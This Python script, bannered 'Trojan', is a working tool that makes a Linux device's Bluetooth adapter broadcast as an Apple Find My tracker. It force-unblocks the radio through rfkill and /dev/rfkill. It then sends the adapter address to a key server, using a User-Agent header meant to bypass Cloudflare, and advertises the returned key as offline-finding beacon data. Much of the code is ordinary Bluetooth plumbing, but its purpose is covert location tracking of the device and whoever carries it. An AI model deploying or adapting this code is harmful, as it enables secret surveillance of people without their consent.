#!/usr/bin/python3
# /*
#  * Copyright (c) 2025 Chapoly1305
#  *
#  * This program is free software: you can redistribute it and/or modify
#  * it under the terms of the GNU General Public License as published by
#  * the Free Software Foundation, version 3.
#  *
#  * This program is distributed in the hope that it will be useful, but
#  * WITHOUT ANY WARRANTY; without even the implied warranty of
#  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
#  * General Public License for more details.
#  *
#  * You should have received a copy of the GNU General Public License
#  * along with this program. If not, see <http://www.gnu.org/licenses/>.
#  */

import argparse
import os
import re
import subprocess
import time
import threading
import urllib.request
import json
import logging

import dbus
import dbus.exceptions
import dbus.mainloop.glib
import dbus.service
from pathlib import Path
import struct

from gi.repository import GObject

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Define constants for BlueZ D-Bus interface names
BLUEZ_SERVICE_NAME = 'org.bluez'
LE_ADVERTISING_MANAGER_IFACE = 'org.bluez.LEAdvertisingManager1'
DBUS_OM_IFACE = 'org.freedesktop.DBus.ObjectManager'
DBUS_PROP_IFACE = 'org.freedesktop.DBus.Properties'
LE_ADVERTISEMENT_IFACE = 'org.bluez.LEAdvertisement1'

class BLEAdvertisementError(Exception):
    pass

class Advertisement(dbus.service.Object):
    PATH_BASE = '/org/bluez/example/advertisement'

    def __init__(self, bus, index, advertising_type):
        self.path = f"{self.PATH_BASE}{index}"
        self.bus = bus
        self.ad_type = advertising_type
        self.manufacturer_data = None
        super().__init__(bus, self.path)

    def get_properties(self):
        properties = {
            'Type': self.ad_type
        }
        if self.manufacturer_data is not None:
            properties['ManufacturerData'] = dbus.Dictionary(self.manufacturer_data, signature='qv')
        return {LE_ADVERTISEMENT_IFACE: properties}

    def get_path(self):
        return dbus.ObjectPath(self.path)

    def add_manufacturer_data(self, manuf_code, data):
        if not self.manufacturer_data:
            self.manufacturer_data = dbus.Dictionary({}, signature='qv')
        self.manufacturer_data[manuf_code] = dbus.Array(data, signature='y')

    @dbus.service.method(DBUS_PROP_IFACE, in_signature='s', out_signature='a{sv}')
    def GetAll(self, interface):
        if interface != LE_ADVERTISEMENT_IFACE:
            raise dbus.exceptions.DBusException(
                'org.freedesktop.DBus.Error.InvalidArgs',
                f'Interface {interface} not supported'
            )
        return self.get_properties()[LE_ADVERTISEMENT_IFACE]

    @dbus.service.method(LE_ADVERTISEMENT_IFACE, in_signature='', out_signature='')
    def Release(self):
        logger.info(f'{self.path}: Released!')

class AdvertisementObject(Advertisement):
    def __init__(self, bus, index, public_key=None, adapter_address=None):
        super().__init__(bus, index, 'peripheral')
        self.bus = bus
        self.adapter_address = adapter_address
        self.public_key = public_key
        self.configure_advertisement_data()

    def configure_advertisement_data(self):
        if self.public_key is None:
            self.add_manufacturer_data(0x004c, [0x12, 0x19, 0x00] + [0] * 24)
        else:
            # Convert the public key from hex string to bytes
            pub_key_bytes = bytearray.fromhex(self.public_key)
            
            # Extract bytes from position 6 to 28 (equivalent to pub_part2)
            pub_middle_part = list(pub_key_bytes[6:28]) if len(pub_key_bytes) >= 28 else []
            
            # Extract the first 2 bits by right-shifting the first byte by 6
            first_two_bits = pub_key_bytes[0] >> 6 if pub_key_bytes else 0
            
            # Create the advertisement payload with the correct bit placement
            self.add_manufacturer_data(0x004c, [0x12, 0x19, 0x00] + pub_middle_part + [first_two_bits] + [0x00])

    @dbus.service.method(LE_ADVERTISEMENT_IFACE, in_signature='', out_signature='')
    def Release(self):
        logger.info(f'{self.path}: Released!')
        GObject.timeout_add(5000, self.restart_advertisement)

    def restart_advertisement(self):
        logger.info("Attempting to restart advertisement...")
        try:
            self.configure_advertisement_data()
            adapter = find_adapter(self.bus)
            if not adapter:
                logger.warning("Adapter not found, retrying...")
                return True

            ad_manager = dbus.Interface(self.bus.get_object(BLUEZ_SERVICE_NAME, adapter),
                                      LE_ADVERTISING_MANAGER_IFACE)
            ad_manager.RegisterAdvertisement(
                self.get_path(), {},
                reply_handler=lambda: logger.info('Advertisement re-registered'),
                error_handler=lambda error: logger.error(f'Failed to re-register advertisement: {error}')
            )
            return False
        except Exception as e:
            logger.error(f"Failed to restart advertisement: {e}")
            return True

def get_adapter_address(bus, adapter_path):
    try:
        adapter_object = bus.get_object(BLUEZ_SERVICE_NAME, adapter_path)
        adapter_props = dbus.Interface(adapter_object, DBUS_PROP_IFACE)
        return adapter_props.Get("org.bluez.Adapter1", "Address")
    except dbus.exceptions.DBusException as e:
        logger.warning(f"Failed to get adapter address: {e}")
        return None

def find_adapter(bus):
    try:
        remote_om = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, '/'), DBUS_OM_IFACE)
        objects = remote_om.GetManagedObjects()
        for o, props in objects.items():
            if LE_ADVERTISING_MANAGER_IFACE in props:
                return str(o)
    except dbus.exceptions.DBusException as e:
        logger.warning(f"Failed to find adapter: {e}")
    return None

def get_pubkey(address: str):
    json_file = 'public_keys.json'

    if os.path.exists(json_file):
        try:
            with open(json_file, 'r') as f:
                stored_keys = json.load(f)
                if address in stored_keys:
                    logger.info(f"Public key loaded from file for address: {address}")
                    return stored_keys[address]
        except json.JSONDecodeError:
            logger.warning(f"Error reading {json_file}")

    url = f"{server_addr}/public-key"
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'User-Agent': 'curl/7.81.0'  # Adding curl-like User-Agent bypass Cloudflare
    }
    data = json.dumps({'address': address.lower().replace(":", "")}).encode('utf-8')

    try:
        req = urllib.request.Request(url, data=data, headers=headers, method='POST')
        with urllib.request.urlopen(req) as response:
            response_data = json.loads(response.read().decode('utf-8'))
            public_key = response_data.get('public_key')

            if public_key:
                try:
                    stored_keys = {}
                    if os.path.exists(json_file):
                        with open(json_file, 'r') as f:
                            stored_keys = json.load(f)
                    stored_keys[address] = public_key
                    with open(json_file, 'w') as f:
                        json.dump(stored_keys, f, indent=2)
                    logger.info(f"Public key saved to file for address: {address}")
                except Exception as e:
                    logger.warning(f"Failed to save public key to file: {e}")

                return public_key

    except urllib.error.URLError as e:
        logger.warning(f"Failed to fetch public key: {e}")
    return None

def extract_numbers(output):
    return [int(num) for num in re.findall(r'^(\d+):', output, re.MULTILINE)]


def write_rfkill_direct():
    """Write directly to /dev/rfkill as a fallback method."""
    try:
        rfkill_dev = Path("/dev/rfkill")
        if not rfkill_dev.exists():
            logger.error("/dev/rfkill device not found")
            return False
            
        # The correct struct format for rfkill event:
        # struct rfkill_event {
        #     __u32 idx;
        #     __u8 type;
        #     __u8 op;
        #     __u8 soft;
        #     __u8 hard;
        # } __packed;
        
        # Pack values:
        # idx = 0 (4 bytes)
        # type = 2 (1 byte) for RFKILL_TYPE_BLUETOOTH
        # op = 3 (1 byte) for RFKILL_OP_CHANGE_ALL
        # soft = 0 (1 byte)
        # hard = 0 (1 byte)
        data = struct.pack("=IBBBB", 0, 2, 3, 0, 0)
        
        try:
            with open("/dev/rfkill", "wb") as f:
                f.write(data)
            logger.info("Successfully wrote to /dev/rfkill")
            return True
        except PermissionError:
            logger.error("Permission denied writing to /dev/rfkill. Try running with sudo")
            return False
        except Exception as e:
            logger.error(f"Error writing to /dev/rfkill: {e}")
            return False
    except Exception as e:
        logger.error(f"Failed to access /dev/rfkill: {e}")
        return False


def setup_bluetooth(bus, adapter):
    """Set up the Bluetooth adapter for advertising with graceful error handling."""
    try:
        adapter_props = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, adapter), DBUS_PROP_IFACE)
        rfkill_success = False
        
        try:
            # Use rfkill command to unblock Bluetooth adapters
            output = subprocess.check_output("rfkill list bluetooth", shell=True).decode('utf-8')
            adapters = extract_numbers(output)
            if adapters:
                for adapter_num in adapters:
                    try:
                        subprocess.check_output(f"rfkill unblock {adapter_num}", shell=True)
                        time.sleep(1)
                        rfkill_success = True
                    except subprocess.CalledProcessError as e:
                        logger.warning(f"Failed to unblock adapter {adapter_num} using rfkill command: {e}")
            else:
                logger.warning("No Bluetooth adapters found with rfkill command")
        except subprocess.CalledProcessError:
            logger.warning("Failed to use rfkill command")
            logger.info("Attempting direct write to /dev/rfkill...")
            rfkill_success = write_rfkill_direct()

        if not rfkill_success:
            logger.warning("Failed to unblock Bluetooth through both rfkill command and direct write")
            logger.warning("You may need a physical login session")

        try:
            adapter_props.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(1))
        except dbus.exceptions.DBusException as e:
            logger.warning(f"Failed to power on Bluetooth adapter: {e}")

        adapter_address = get_adapter_address(bus, adapter)
        if adapter_address:
            return adapter_address
        else:
            logger.error("Could not get adapter address")
            sys.exit(1)
            
    except Exception as e:
        logger.warning(f"Bluetooth setup failed: {e}")
        sys.exit(1)

def main(timeout=0):
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()

    adapter = find_adapter(bus)
    if not adapter:
        logger.error('LEAdvertisingManager1 interface not found')
        return

    adapter_address = setup_bluetooth(bus, adapter)
    logger.info(f"Adapter address: {adapter_address}")

    public_key = None
    
    # Try to get public key a few times before proceeding
    while public_key is None:
        public_key = get_pubkey(adapter_address)
        if public_key:
            break
        time.sleep(2)
        
    if public_key is None:
        logger.warning("Could not obtain public key, proceeding with default advertisement data")

    try:
        prepare_advertisement = AdvertisementObject(bus, 0, public_key, adapter_address)
        ad_manager = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, adapter),
                                  LE_ADVERTISING_MANAGER_IFACE)

        mainloop = GObject.MainLoop()

        def register_ad_cb():
            logger.info('Advertisement registered')

        def register_ad_error_cb(error):
            logger.error(f'Failed to register advertisement: {error}')

        ad_manager.RegisterAdvertisement(
            prepare_advertisement.get_path(), {},
            reply_handler=register_ad_cb,
            error_handler=register_ad_error_cb
        )

        if timeout > 0:
            threading.Timer(timeout, mainloop.quit).start()
            logger.info(f'Advertising for {timeout} seconds...')
        else:
            logger.info('Advertising forever...')

        try:
            mainloop.run()
        except KeyboardInterrupt:
            logger.info("Interrupted by user")
        finally:
            try:
                ad_manager.UnregisterAdvertisement(prepare_advertisement)
                logger.info('Advertisement unregistered')
                dbus.service.Object.remove_from_connection(prepare_advertisement)
            except Exception as e:
                logger.warning(f"Error during cleanup: {e}")

    except Exception as e:
        logger.error(f"Error during advertisement setup: {e}")

if __name__ == '__main__':
    banner = """
 _____           _             
/__   \_ __ ___ (_) __ _ _ __  
  / /\/ '__/ _ \| |/ _` | '_ \ 
 / /  | | | (_) | | (_| | | | |
 \/   |_|  \___// |\__,_|_| |_|
              |__/             

"""
    print(banner)
    server_addr = "http://localhost:7898"
    parser = argparse.ArgumentParser()
    parser.add_argument('--timeout', default=0, type=int,
                       help="advertise for this many seconds then stop, 0=run forever (default: 0)")
    args = parser.parse_args()

    main(args.timeout)
